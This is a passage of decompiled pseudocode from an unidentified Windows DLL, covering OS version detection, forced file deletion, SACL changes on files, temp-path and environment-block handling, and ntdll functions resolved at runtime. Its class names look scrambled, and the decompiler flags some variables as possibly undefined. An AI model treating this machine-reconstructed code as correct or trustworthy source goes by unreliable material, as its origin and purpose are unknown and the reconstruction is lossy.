    || *(_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 44))(this + 1, v4) != *v2 )
  {
    (*(void (__thiscall **)(_DWORD *, _DWORD *, int))(this[1] + 32))(this + 1, v2, v4);
    v5 = this[5];
    HIBYTE(a2) = 0;
    (*(void (__thiscall **)(_DWORD *, char *, int))(v5 + 32))(this + 5, (char *)&a2 + 3, v4);
  }
  return (*(int (__thiscall **)(_DWORD *, int))(this[5] + 44))(this + 5, v4);
}

//----- (100142CF) --------------------------------------------------------
_DWORD *__thiscall sub_100142CF(_DWORD *this, _DWORD *a2)
{
  _DWORD *v2; // esi
  int v3; // eax
  int v5; // [esp-8h] [ebp-24h]
  int v6; // [esp-4h] [ebp-20h]

  v2 = this + 1;
  *a2 = off_100FBF5C;
  *a2 = &off_10102728;
  a2[2] = 1;
  v6 = (*(int (__thiscall **)(_DWORD *))(this[1] + 4))(this + 1);
  v5 = v2[3];
  v3 = (*(int (__thiscall **)(_DWORD *))(*v2 + 4))(v2);
  sub_1005753F(a2, v3, v5, v6);
  return a2;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 10102728: using guessed type int (__thiscall *off_10102728)(void *Block, char);

//----- (10014334) --------------------------------------------------------
void *__thiscall sub_10014334(_DWORD *this)
{
  *this = &off_10102704;
  return sub_1001422D(this + 1);
}
// 10102704: using guessed type int (__thiscall *off_10102704)(void *Block, char);

//----- (10014360) --------------------------------------------------------
BOOL __thiscall sub_10014360(_DWORD *this, int a2)
{
  char v3; // bl

  v3 = (*(int (__thiscall **)(_DWORD *, int))(*this + 4))(this, a2);
  *(_BYTE *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 16))(this + 1, a2) = 1;
  return v3 == 0;
}

//----- (1001438C) --------------------------------------------------------
int __thiscall sub_1001438C(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int))(this[1] + 48))(this + 1, a2);
  return a2;
}

//----- (100143C2) --------------------------------------------------------
int __thiscall sub_100143C2(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int))(this[1] + 36))(this + 1, a2);
  return a2;
}

//----- (100143F8) --------------------------------------------------------
int __thiscall sub_100143F8(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(this[1] + 56))(this + 1);
}

//----- (10014404) --------------------------------------------------------
int __thiscall sub_10014404(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(this[1] + 28))(this + 1);
}

//----- (1001440C) --------------------------------------------------------
int __thiscall sub_1001440C(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(this[1] + 32))(this + 1);
}

//----- (10014414) --------------------------------------------------------
void *__thiscall sub_10014414(void *Block, char a2)
{
  sub_10013CFA((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10014433) --------------------------------------------------------
void *__thiscall sub_10014433(void *Block, char a2)
{
  sub_10013F22((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10014452) --------------------------------------------------------
_DWORD *__thiscall sub_10014452(_DWORD *Block, char a2)
{
  sub_1001422D(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10014471) --------------------------------------------------------
_DWORD *__thiscall sub_10014471(_DWORD *Block, char a2)
{
  sub_10014334(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10014490) --------------------------------------------------------
_DWORD *__userpurge sub_10014490@<eax>(_DWORD *a1@<esi>, _DWORD *a2)
{
  int v2; // eax
  int v4; // [esp-8h] [ebp-18h]
  int v5; // [esp-4h] [ebp-14h]

  *a2 = off_100FBF5C;
  *a2 = &off_101027C0;
  a2[2] = 1;
  v5 = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  v4 = a1[3];
  v2 = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  sub_10014131(a2, v2, v4, v5);
  return a2;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 101027C0: using guessed type int (__thiscall *off_101027C0)(void *Block, char);

//----- (100144E2) --------------------------------------------------------
_DWORD *__stdcall sub_100144E2(_DWORD *a1)
{
  unsigned int v1; // eax

  *a1 = off_100FBF5C;
  *a1 = &off_10102784;
  a1[1] = off_100FBF5C;
  a1[1] = &off_10102728;
  v1 = sub_1001411E(1u, 0x10u);
  a1[2] = 0;
  a1[3] = v1;
  a1[4] = operator new(4 * v1);
  sub_10014563(a1 + 5);
  return a1;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 10102728: using guessed type int (__thiscall *off_10102728)(void *Block, char);
// 10102784: using guessed type int (__thiscall *off_10102784)(void *Block, char);

//----- (10014563) --------------------------------------------------------
_DWORD *__stdcall sub_10014563(_DWORD *a1)
{
  unsigned int v1; // eax

  *a1 = off_100FBF5C;
  *a1 = &off_101027C0;
  v1 = sub_1001411E(1u, 0x10u);
  a1[1] = 0;
  a1[2] = v1;
  a1[3] = operator new(v1);
  return a1;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 101027C0: using guessed type int (__thiscall *off_101027C0)(void *Block, char);

//----- (100145B3) --------------------------------------------------------
_DWORD *__stdcall sub_100145B3(_DWORD *a1, int a2)
{
  if ( a2 )
  {
    *a1 = &unk_101022FC;
    a1[2] = &unk_10102930;
    sub_1000E7F7(a1 + 3, 1, 0);
  }
  sub_1000E9DF(a1, 1, 0);
  GetLastError();
  *(_DWORD *)((char *)a1 + *(_DWORD *)(a1[2] + 4) + 8) = &off_101022EC;
  *(_DWORD *)((char *)a1 + *(_DWORD *)(*a1 + 4)) = &off_101022F4;
  return a1;
}
// 101022EC: using guessed type int (__stdcall *off_101022EC)(char);
// 101022F4: using guessed type int (__stdcall *off_101022F4)(char);

//----- (10014635) --------------------------------------------------------
int __thiscall sub_10014635(_DWORD *this)
{
  int v1; // eax
  int result; // eax

  *(_DWORD *)((char *)this + *(_DWORD *)(*(this - 3) + 4) - 12) = &off_101022F4;
  v1 = this != (_DWORD *)12 ? (unsigned int)(this - 1) : 0;
  *(_DWORD *)(*(_DWORD *)(*(_DWORD *)v1 + 4) + v1) = &off_101022EC;
  result = *(_DWORD *)(*(this - 3) + 4);
  *(_DWORD *)((char *)this + result - 12) = &off_100FC1F4;
  return result;
}
// 100FC1F4: using guessed type int (__stdcall *off_100FC1F4)(char);
// 101022EC: using guessed type int (__stdcall *off_101022EC)(char);
// 101022F4: using guessed type int (__stdcall *off_101022F4)(char);

//----- (1001468F) --------------------------------------------------------
int __thiscall sub_1001468F(_DWORD *this)
{
  *(_DWORD *)((char *)this + *(_DWORD *)(*(this - 3) + 4) - 12) = &off_10102304;
  return sub_10014635(this);
}
// 10102304: using guessed type int (__stdcall *off_10102304)(char);

//----- (100146C0) --------------------------------------------------------
_DWORD *__stdcall sub_100146C0(_DWORD *a1)
{
  *a1 = &unk_101022FC;
  a1[2] = &unk_10102930;
  sub_1000E7F7(a1 + 3, 1, 0);
  sub_100145B3(a1, 0);
  *(_DWORD *)((char *)a1 + *(_DWORD *)(*a1 + 4)) = &off_10102304;
  return a1;
}
// 10102304: using guessed type int (__stdcall *off_10102304)(char);

//----- (10014724) --------------------------------------------------------
_DWORD *__stdcall sub_10014724(_DWORD *a1)
{
  *a1 = &unk_100FC1FC;
  sub_1000E7F7(a1 + 2, 1, 0);
  sub_1000E9DF(a1, 1, 0);
  *(_DWORD *)((char *)a1 + *(_DWORD *)(*a1 + 4)) = &off_10102DEC;
  return a1;
}
// 10102DEC: using guessed type int (__stdcall *off_10102DEC)(char);

//----- (10014782) --------------------------------------------------------
int __thiscall sub_10014782(void *this)
{
  _DWORD *v1; // eax
  _DWORD v3[4]; // [esp+0h] [ebp-10h] BYREF

  v3[0] = this;
  sub_100147E7();
  if ( !sub_100147C4() )
  {
    v1 = sub_1000E7F7(v3, 1, 0);
    v3[3] = 0;
    sub_10007882((int)v1);
  }
  return dword_1017A028;
}
// 1017A028: using guessed type int dword_1017A028;

//----- (100147C4) --------------------------------------------------------
BOOL sub_100147C4()
{
  BOOL result; // eax

  sub_100147E7();
  result = 0;
  if ( dword_1017A024 == 1 )
  {
    sub_100147E7();
    if ( dword_1017A020 >= 6 )
      return 1;
  }
  return result;
}
// 1017A020: using guessed type int dword_1017A020;
// 1017A024: using guessed type int dword_1017A024;

//----- (100147E7) --------------------------------------------------------
void *sub_100147E7()
{
  void *result; // eax
  _DWORD *v1; // eax
  int v2[3]; // [esp+0h] [ebp-24h] BYREF
  void *v3; // [esp+Ch] [ebp-18h] BYREF
  int v4; // [esp+10h] [ebp-14h] BYREF
  int v5[4]; // [esp+14h] [ebp-10h] BYREF

  result = &loc_100A474D;
  if ( byte_1013FD2E )
  {
    if ( !sub_1001488C(&v3, &v4, v5) )
    {
      v1 = sub_1000E9DF(v2, 1, 1);
      v5[3] = 0;
      sub_1000A947(v1, 144);
    }
    dword_1017A020 = v5[0];
    dword_1017A024 = v4;
    result = v3;
    dword_1017A028 = (int)v3;
    byte_1013FD2E = 0;
  }
  return result;
}
// 1013FD2E: using guessed type char byte_1013FD2E;
// 1017A020: using guessed type int dword_1017A020;
// 1017A024: using guessed type int dword_1017A024;
// 1017A028: using guessed type int dword_1017A028;
// 100147E7: using guessed type int var_24[3];

//----- (10014857) --------------------------------------------------------
char __usercall sub_10014857@<al>(_DWORD *a1@<esi>)
{
  struct _OSVERSIONINFOA VersionInformation; // [esp+0h] [ebp-9Ch] BYREF
  unsigned __int8 v3; // [esp+9Ah] [ebp-2h]

  *a1 = 0;
  VersionInformation.dwOSVersionInfoSize = 156;
  if ( !GetVersionExA(&VersionInformation) )
    return 0;
  *a1 = v3;
  return 1;
}

//----- (1001488C) --------------------------------------------------------
char __usercall sub_1001488C@<al>(_DWORD *a1@<eax>, _DWORD *a2@<ecx>, _DWORD *a3@<edi>)
{
  char result; // al
  bool v6; // zf
  DWORD v7; // eax
  DWORD v8; // eax
  DWORD v9; // eax
  struct _OSVERSIONINFOA VersionInformation; // [esp+8h] [ebp-98h] BYREF
  int v11; // [esp+9Ch] [ebp-4h] BYREF

  *a3 = 0;
  *a1 = 0;
  VersionInformation.dwOSVersionInfoSize = 148;
  if ( !GetVersionExA(&VersionInformation) )
    return 0;
  if ( VersionInformation.dwPlatformId == 1 )
  {
    v6 = VersionInformation.dwMajorVersion == 4;
    *a2 = 0;
    if ( v6 )
    {
      if ( VersionInformation.dwMinorVersion )
      {
        if ( VersionInformation.dwMinorVersion == 10 )
        {
          *a3 = 2;
        }
        else
        {
          if ( VersionInformation.dwMinorVersion != 90 )
            return 0;
          *a3 = 3;
        }
      }
      else
      {
        *a3 = 1;
      }
    }
    else
    {
      *a3 = 0;
    }
    return 1;
  }
  if ( VersionInformation.dwPlatformId != 2 )
    return 0;
  v7 = VersionInformation.dwMajorVersion - 3;
  v6 = VersionInformation.dwMajorVersion == 3;
  *a2 = 1;
  if ( v6 )
  {
    *a3 = 4;
    return 1;
  }
  v8 = v7 - 1;
  if ( !v8 )
  {
    *a3 = 5;
    return 1;
  }
  v9 = v8 - 1;
  if ( !v9 )
  {
    if ( !sub_10014857(a1) )
      return 0;
    if ( VersionInformation.dwMinorVersion )
    {
      if ( VersionInformation.dwMinorVersion == 1 )
      {
        *a3 = 7;
      }
      else
      {
        if ( VersionInformation.dwMinorVersion != 2 )
          return 0;
        *a3 = 8;
      }
    }
    else
    {
      *a3 = 6;
    }
    return 1;
  }
  if ( v9 != 1 )
    return 0;
  v11 = 0;
  if ( !sub_10014A32(&v11) || v11 == 2 || !sub_10014857(a1) )
    return 0;
  if ( VersionInformation.dwMinorVersion )
  {
    if ( VersionInformation.dwMinorVersion == 1 )
    {
      if ( *a1 != 1 )
      {
        if ( (unsigned int)(*a1 - 2) <= 1 )
        {
          result = 1;
          if ( v11 == 1 )
            *a3 = 14;
          else
            *a3 = 13;
          return result;
        }
        return 0;
      }
      *a3 = 12;
    }
    return 1;
  }
  if ( *a1 == 1 )
  {
    *a3 = 9;
    return 1;
  }
  if ( (unsigned int)(*a1 - 2) > 1 )
    return 0;
  result = 1;
  if ( v11 == 1 )
    *a3 = 11;
  else
    *a3 = 10;
  return result;
}

//----- (10014A32) --------------------------------------------------------
char __usercall sub_10014A32@<al>(_DWORD *a1@<ebx>)
{
  HMODULE ModuleHandleW; // eax
  BOOL (__stdcall *GetProductInfo)(DWORD, DWORD, DWORD, DWORD, PDWORD); // eax
  int v4; // eax
  _BYTE VersionInformation[156]; // [esp+0h] [ebp-A0h] BYREF
  int v6; // [esp+9Ch] [ebp-4h] BYREF

  v6 = 0;
  *a1 = 0;
  memset(VersionInformation, 0, sizeof(VersionInformation));
  *(_DWORD *)VersionInformation = 156;
  if ( !GetVersionExA((LPOSVERSIONINFOA)VersionInformation) )
    return 0;
  ModuleHandleW = GetModuleHandleW(ModuleName);
  if ( !ModuleHandleW )
    return 0;
  GetProductInfo = (BOOL (__stdcall *)(DWORD, DWORD, DWORD, DWORD, PDWORD))GetProcAddress(ModuleHandleW, ProcName);
  if ( !GetProductInfo
    || !GetProductInfo(
          *(_DWORD *)&VersionInformation[4],
          *(_DWORD *)&VersionInformation[8],
          *(unsigned __int16 *)&VersionInformation[148],
          *(unsigned __int16 *)&VersionInformation[150],
          (PDWORD)&v6) )
  {
    return 0;
  }
  v4 = v6;
  if ( v6 == -1412584499 || !v6 )
    *a1 = 2;
  if ( v4 == 12 || v4 == 14 || v4 == 13 || v4 == 39 || v4 == 41 || v4 == 40 || v4 == 29 )
    *a1 = 1;
  return 1;
}

//----- (10014AF7) --------------------------------------------------------
bool __usercall sub_10014AF7@<al>(int a1@<eax>)
{
  return GetFileAttributesW(*(LPCWSTR *)(*(_DWORD *)(a1 + 4) + 12)) != -1;
}

//----- (10014B0E) --------------------------------------------------------
DWORD __thiscall sub_10014B0E(_DWORD *this)
{
  DWORD FileAttributesW; // ebx
  DWORD result; // eax
  _DWORD *v4; // eax
  _DWORD v5[8]; // [esp+10h] [ebp-20h] BYREF

  FileAttributesW = GetFileAttributesW(*(LPCWSTR *)(this[1] + 12));
  SetFileAttributesW(*(LPCWSTR *)(this[1] + 12), 0x80u);
  result = DeleteFileW(*(LPCWSTR *)(this[1] + 12));
  if ( !result )
  {
    result = GetLastError();
    if ( result != 2 && result != 3 )
    {
      SetFileAttributesW(*(LPCWSTR *)(this[1] + 12), FileAttributesW);
      v4 = sub_100145B3(v5, 1);
      v5[7] = 0;
      sub_1000C948(v4, 309);
    }
  }
  return result;
}

//----- (10014BAB) --------------------------------------------------------
int sub_10014BAB()
{
  wchar_t *v0; // eax
  volatile LONG *v1; // ecx
  _DWORD *v2; // eax
  int v3; // esi
  volatile LONG *v5; // [esp-8h] [ebp-68h] BYREF
  volatile LONG *v6; // [esp-4h] [ebp-64h]
  int v7; // [esp+0h] [ebp-60h] BYREF
  int v8[10]; // [esp+10h] [ebp-50h] BYREF
  char v9[8]; // [esp+38h] [ebp-28h] BYREF
  int v10[5]; // [esp+40h] [ebp-20h] BYREF
  int v11; // [esp+5Ch] [ebp-4h]

  v10[4] = (int)&v7;
  v11 = 0;
  v0 = (wchar_t *)sub_1000CC40((int)&unk_10179F90);
  sub_1000D17D(v10, v0);
  LOBYTE(v11) = 1;
  sub_1000E111((int)v10);
  v6 = v1;
  v5 = v1;
  v10[2] = (int)&v5;
  sub_1000B964(&v5);
  LOBYTE(v11) = 1;
  v2 = sub_1000BA6E(-1, 0x80000000, v8, (int)v10, 128, -1, (int)v5, v6);
  LOBYTE(v11) = 3;
  v3 = *(_DWORD *)(*(int (__thiscall **)(_DWORD *, char *, int))(*v2 + 88))(v2, v9, 1);
  LOBYTE(v11) = 1;
  sub_1000BB54((int)v8);
  LOBYTE(v11) = 0;
  sub_1000D3AD(v10);
  return v3;
}
// 10014BE3: variable 'v1' is possibly undefined
// 10014BAB: using guessed type char var_28[8];

//----- (10014C6C) --------------------------------------------------------
bool __cdecl sub_10014C6C(int a1)
{
  _DWORD *v1; // eax
  _DWORD *v2; // eax
  _DWORD *v3; // eax
  _DWORD v5[3]; // [esp+Ch] [ebp-30h] BYREF
  _DWORD v6[2]; // [esp+18h] [ebp-24h] BYREF
  BOOL bSaclPresent; // [esp+20h] [ebp-1Ch] BYREF
  BOOL bSaclDefaulted; // [esp+24h] [ebp-18h] BYREF
  PACL pSacl; // [esp+28h] [ebp-14h] BYREF
  PSECURITY_DESCRIPTOR SecurityDescriptor; // [esp+2Ch] [ebp-10h] BYREF
  int v11; // [esp+38h] [ebp-4h]

  SecurityDescriptor = 0;
  GetCurrentProcessId();
  GetCurrentProcessId();
  sub_10011BB7(v6);
  v11 = 0;
  pSacl = 0;
  bSaclPresent = 0;
  bSaclDefaulted = 0;
  if ( !ConvertStringSecurityDescriptorToSecurityDescriptorW(StringSecurityDescriptor, 1u, &SecurityDescriptor, 0) )
  {
    v1 = sub_1000E9DF(v5, 1, 1);
    LOBYTE(v11) = 1;
    sub_1000A947(v1, 628);
  }
  GetCurrentProcessId();
  GetCurrentProcessId();
  sub_10011E5C((int)v6, (int)SecurityDescriptor);
  if ( !GetSecurityDescriptorSacl(SecurityDescriptor, &bSaclPresent, &pSacl, &bSaclDefaulted) )
  {
    v2 = sub_1000E9DF(v5, 1, 1);
    LOBYTE(v11) = 2;
    sub_1000A947(v2, 632);
  }
  if ( SetNamedSecurityInfoW(*(LPWSTR *)(*(_DWORD *)(a1 + 4) + 12), SE_FILE_OBJECT, 0x10u, 0, 0, 0, pSacl) )
  {
    v3 = sub_1000E9DF(v5, 1, 1);
    LOBYTE(v11) = 3;
    sub_1000A947(v3, 638);
  }
  v11 = -1;
  return sub_10011E1D(v6);
}
// 10014C6C: using guessed type _DWORD var_24[2];
// 10014C6C: using guessed type _DWORD var_30[3];

//----- (10014D59) --------------------------------------------------------
_DWORD *__cdecl sub_10014D59(_DWORD *a1)
{
  _DWORD *v1; // eax
  LONG *v2; // eax
  WCHAR Buffer[266]; // [esp+4h] [ebp-238h] BYREF
  int v5[3]; // [esp+218h] [ebp-24h] BYREF
  int v6[2]; // [esp+224h] [ebp-18h] BYREF
  int v7; // [esp+22Ch] [ebp-10h]
  int v8; // [esp+238h] [ebp-4h]

  v7 = 0;
  if ( !GetCurrentDirectoryW(0x104u, Buffer) )
  {
    v1 = sub_10014724(v5);
    v8 = 1;
    sub_100150F2(v1, 23);
  }
  sub_1000D17D(v6, Buffer);
  v8 = 2;
  v2 = sub_10015079(v6);
  sub_1000D372(a1, (int)v2);
  v7 = 1;
  LOBYTE(v8) = 0;
  sub_1000D3AD(v6);
  return a1;
}
// 10014D59: using guessed type int var_24[3];

//----- (10014DE5) --------------------------------------------------------
_DWORD *__cdecl sub_10014DE5(_DWORD *a1)
{
  _DWORD *v1; // eax
  LONG *v2; // eax
  WCHAR Buffer[266]; // [esp+4h] [ebp-238h] BYREF
  int v5[3]; // [esp+218h] [ebp-24h] BYREF
  int v6[2]; // [esp+224h] [ebp-18h] BYREF
  int v7; // [esp+22Ch] [ebp-10h]
  int v8; // [esp+238h] [ebp-4h]

  v7 = 0;
  if ( !GetWindowsDirectoryW(Buffer, 0x104u) )
  {
    v1 = sub_10014724(v5);
    v8 = 1;
    sub_100150F2(v1, 35);
  }
  sub_1000D17D(v6, Buffer);
  v8 = 2;
  v2 = sub_10015079(v6);
  sub_1000D372(a1, (int)v2);
  v7 = 1;
  LOBYTE(v8) = 0;
  sub_1000D3AD(v6);
  return a1;
}
// 10014DE5: using guessed type int var_24[3];

//----- (10014E71) --------------------------------------------------------
_DWORD *__cdecl sub_10014E71(_DWORD *a1)
{
  _DWORD *v1; // eax
  LONG *v2; // eax
  WCHAR Buffer[266]; // [esp+4h] [ebp-238h] BYREF
  int v5[3]; // [esp+218h] [ebp-24h] BYREF
  int v6[2]; // [esp+224h] [ebp-18h] BYREF
  int v7; // [esp+22Ch] [ebp-10h]
  int v8; // [esp+238h] [ebp-4h]

  v7 = 0;
  if ( !GetSystemDirectoryW(Buffer, 0x104u) )
  {
    v1 = sub_10014724(v5);
    v8 = 1;
    sub_100150F2(v1, 47);
  }
  sub_1000D17D(v6, Buffer);
  v8 = 2;
  v2 = sub_10015079(v6);
  sub_1000D372(a1, (int)v2);
  v7 = 1;
  LOBYTE(v8) = 0;
  sub_1000D3AD(v6);
  return a1;
}
// 10014E71: using guessed type int var_24[3];

//----- (10014EFD) --------------------------------------------------------
_DWORD *__cdecl sub_10014EFD(_DWORD *a1)
{
  _DWORD *v1; // eax
  LONG *v2; // eax
  WCHAR Buffer[266]; // [esp+4h] [ebp-238h] BYREF
  int v5[3]; // [esp+218h] [ebp-24h] BYREF
  int v6[2]; // [esp+224h] [ebp-18h] BYREF
  int v7; // [esp+22Ch] [ebp-10h]
  int v8; // [esp+238h] [ebp-4h]

  v7 = 0;
  if ( !GetTempPathW(0x104u, Buffer) )
  {
    v1 = sub_10014724(v5);
    v8 = 1;
    sub_100150F2(v1, 59);
  }
  sub_1000D17D(v6, Buffer);
  v8 = 2;
  v2 = sub_10015079(v6);
  sub_1000D372(a1, (int)v2);
  v7 = 1;
  LOBYTE(v8) = 0;
  sub_1000D3AD(v6);
  return a1;
}
// 10014EFD: using guessed type int var_24[3];

//----- (10014F89) --------------------------------------------------------
_DWORD *__cdecl sub_10014F89(_DWORD *a1, int a2, int a3, int a4, int a5)
{
  _DWORD *v5; // eax
  WCHAR TempFileName[262]; // [esp+4h] [ebp-228h] BYREF
  int v8[3]; // [esp+210h] [ebp-1Ch] BYREF
  int v9; // [esp+21Ch] [ebp-10h]
  int v10; // [esp+228h] [ebp-4h]

  v9 = 0;
  v10 = 2;
  if ( !GetTempFileNameW(*(LPCWSTR *)(a3 + 12), *(LPCWSTR *)(a5 + 12), 0, TempFileName) )
  {
    v5 = sub_10014724(v8);
    LOBYTE(v10) = 3;
    sub_100150F2(v5, 71);
  }
  sub_1000D17D(a1, TempFileName);
  v9 = 1;
  LOBYTE(v10) = 1;
  sub_1000D3AD(&a2);
  LOBYTE(v10) = 0;
  sub_1000D3AD(&a4);
  return a1;
}
// 10014F89: using guessed type int var_1C[3];

//----- (10015017) --------------------------------------------------------
_DWORD *__cdecl sub_10015017(_DWORD *a1)
{
  int v1; // ecx
  int v2; // ecx
  int v4; // [esp-10h] [ebp-2Ch] BYREF
  int v5; // [esp-Ch] [ebp-28h]
  int v6; // [esp-8h] [ebp-24h] BYREF
  int v7; // [esp-4h] [ebp-20h]
  void *v8; // [esp+4h] [ebp-18h]
  void *v9; // [esp+8h] [ebp-14h]
  int v10; // [esp+Ch] [ebp-10h]
  int v11; // [esp+18h] [ebp-4h]

  v10 = 0;
  v7 = v1;
  v6 = v1;
  v9 = &v6;
  sub_1000D372(&v6, (int)&unk_101868F4);
  v11 = 1;
  v5 = v2;
  v4 = v2;
  v8 = &v4;
  sub_10014EFD(&v4);
  LOBYTE(v11) = 0;
  sub_10014F89(a1, v4, v5, v6, v7);
  return a1;
}
// 10015029: variable 'v1' is possibly undefined
// 10015041: variable 'v2' is possibly undefined

//----- (10015079) --------------------------------------------------------
LONG *__thiscall sub_10015079(LONG *this)
{
  int v3[3]; // [esp+10h] [ebp-18h] BYREF
  int v4; // [esp+24h] [ebp-4h]

  if ( *(_WORD *)sub_1000D52B((int)this, *(_DWORD *)(this[1] + 28) - 1, this) != 92 )
  {
    sub_1000D17D(v3, asc_10179ECC);
    v4 = 0;
    sub_1000D575((int)this, v3);
    v4 = -1;
    sub_1000D3AD(v3);
  }
  return this;
}

//----- (100150F2) --------------------------------------------------------
void __cdecl __noreturn sub_100150F2(_DWORD *a1, int a2)
{
  _DWORD pExceptionObject[3]; // [esp+0h] [ebp-Ch] BYREF

  sub_1002010F(pExceptionObject, a1, 1);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVUPQaqbVhsrnozqr_jhzi_sr__);
}
// 100150F2: using guessed type _DWORD pExceptionObject[3];

//----- (10015117) --------------------------------------------------------
int *__stdcall sub_10015117(int a1, int a2, HANDLE hToken)
{
  _DWORD *v3; // eax
  int v5[3]; // [esp+0h] [ebp-18h] BYREF
  int v6; // [esp+14h] [ebp-4h]

  v6 = 0;
  dword_1017DB1C = (int)&off_1010281C;
  if ( !CreateEnvironmentBlock(&Environment, hToken, 0) )
  {
    v3 = sub_1000E9DF(v5, 1, 1);
    LOBYTE(v6) = 1;
    sub_1000A947(v3, 27);
  }
  sub_1001B56C(&a1);
  return &dword_1017DB1C;
}
// 1010281C: using guessed type int (__thiscall *off_1010281C)(void *Block, char);
// 1017DB1C: using guessed type int dword_1017DB1C;
// 10015117: using guessed type int var_18[3];

//----- (1001517D) --------------------------------------------------------
LPVOID *__thiscall sub_1001517D(LPVOID *Block, char a2)
{
  sub_1001519C(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001519C) --------------------------------------------------------
BOOL __thiscall sub_1001519C(LPVOID *this)
{
  _DWORD v2[7]; // [esp+0h] [ebp-1Ch] BYREF

  v2[3] = v2;
  *this = &off_1010281C;
  v2[6] = 0;
  return DestroyEnvironmentBlock(this[1]);
}
// 1010281C: using guessed type int (__thiscall *off_1010281C)(void *Block, char);

//----- (100151DD) --------------------------------------------------------
LONG *__cdecl sub_100151DD(LONG *a1, int a2)
{
  int v2; // ecx
  char *ModuleHandleA; // edi
  _DWORD *v4; // eax
  char *v5; // eax
  int v6; // eax
  _DWORD *v7; // eax
  LONG v8; // eax
  int v9; // eax
  int v11; // [esp-8h] [ebp-50h] BYREF
  int v12; // [esp-4h] [ebp-4Ch]
  char v13[8]; // [esp+10h] [ebp-38h] BYREF
  __int16 v14; // [esp+18h] [ebp-30h] BYREF
  __int16 v15; // [esp+1Ah] [ebp-2Eh]
  __int16 *v16; // [esp+1Ch] [ebp-2Ch]
  void *v17[2]; // [esp+20h] [ebp-28h] BYREF
  int v18; // [esp+28h] [ebp-20h]
  void *v19; // [esp+2Ch] [ebp-1Ch] BYREF
  __int16 v20[2]; // [esp+30h] [ebp-18h] BYREF
  int v21[2]; // [esp+34h] [ebp-14h] BYREF
  int v22; // [esp+44h] [ebp-4h]

  v22 = 0;
  v18 = 0;
  v20[0] = 0;
  v21[0] = 0;
  v20[1] = 0;
  ModuleHandleA = (char *)GetModuleHandleA(aNtdllDll_0);
  if ( !ModuleHandleA )
  {
    v4 = sub_1000E7F7(&v19, 1, 0);
    v22 = 1;
    v12 = 72;
    sub_10007882((int)v4);
  }
  v12 = v2;
  v11 = v2;
  v19 = &v11;
  sub_1000D17D(&v11, aRtlexpandenvir);
  v22 = 0;
  v19 = sub_1001E605(ModuleHandleA);
  v17[1] = &v11;
  sub_1000D17D(&v11, aRtlinitunicode);
  v22 = 0;
  v5 = sub_1001E605(ModuleHandleA);
  ((void (__stdcall *)(char *, _DWORD))v5)(v13, *(_DWORD *)(*(_DWORD *)(a2 + 4) + 12));
  v16 = v20;
  v14 = 0;
  v15 = 0;
  v6 = ((int (__stdcall *)(_DWORD, char *, __int16 *, int *))v19)(0, v13, &v14, v21);
  if ( v6 != -1073741789 && v6 < 0 )
  {
    v7 = sub_10050D97(v17, v6);
    v22 = 4;
    v12 = 90;
    goto LABEL_6;
  }
  sub_1000D1D6(a1, (unsigned int)v21[0] >> 1);
  v22 = 0;
  v18 = 1;
  v16 = (__int16 *)sub_1000D679(a1);
  v8 = a1[1];
  v14 = 0;
  v15 = 2 * *(_DWORD *)(v8 + 28);
  v9 = ((int (__stdcall *)(_DWORD, char *, __int16 *, int *))v19)(0, v13, &v14, v21);
  if ( v9 < 0 )
  {
    v7 = sub_10050D97(v17, v9);
    v22 = 5;
    v12 = 98;
LABEL_6:
    sub_10015338((int)v7, v12);
  }
  sub_1000D6AC((int)a1);
  return a1;
}
// 1001522F: variable 'v2' is possibly undefined

//----- (10015338) --------------------------------------------------------
void __cdecl __noreturn sub_10015338(int a1, int a2)
{
  _DWORD pExceptionObject[2]; // [esp+0h] [ebp-8h] BYREF

  sub_10051122(pExceptionObject, a1);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVEtKqstreari_gfjjefwq_sr__);
}
// 10015338: using guessed type _DWORD pExceptionObject[2];

//----- (1001535A) --------------------------------------------------------
void *__thiscall sub_1001535A(void *this, int a2)
{
  _DWORD *v3; // esi
  int v4; // edx
  _DWORD *v5; // edi
  int *v6; // eax
  int i; // esi
  int v8; // edx
  _DWORD *v9; // eax
  int v11; // [esp+0h] [ebp-FCh] BYREF
  char v12[44]; // [esp+10h] [ebp-ECh] BYREF
  HANDLE v13[7]; // [esp+3Ch] [ebp-C0h] BYREF
  int v14[3]; // [esp+58h] [ebp-A4h] BYREF
  int v15[3]; // [esp+64h] [ebp-98h] BYREF
  struct _MEMORY_BASIC_INFORMATION Buffer; // [esp+70h] [ebp-8Ch] BYREF
  void *v17[2]; // [esp+8Ch] [ebp-70h] BYREF
  _DWORD *v18[2]; // [esp+94h] [ebp-68h] BYREF
  __int64 v19; // [esp+9Ch] [ebp-60h] BYREF
  __int64 v20; // [esp+A4h] [ebp-58h] BYREF
  int v21[4]; // [esp+ACh] [ebp-50h] BYREF
  __int64 AllocationBase; // [esp+BCh] [ebp-40h]
  void *v23; // [esp+C4h] [ebp-38h]
  int *v24; // [esp+D0h] [ebp-2Ch]
  int v25; // [esp+D4h] [ebp-28h] BYREF
  int v26[2]; // [esp+D8h] [ebp-24h] BYREF
  int v27; // [esp+E0h] [ebp-1Ch]
  int v28; // [esp+E4h] [ebp-18h]
  char v29; // [esp+EBh] [ebp-11h]
  int *v30; // [esp+ECh] [ebp-10h]
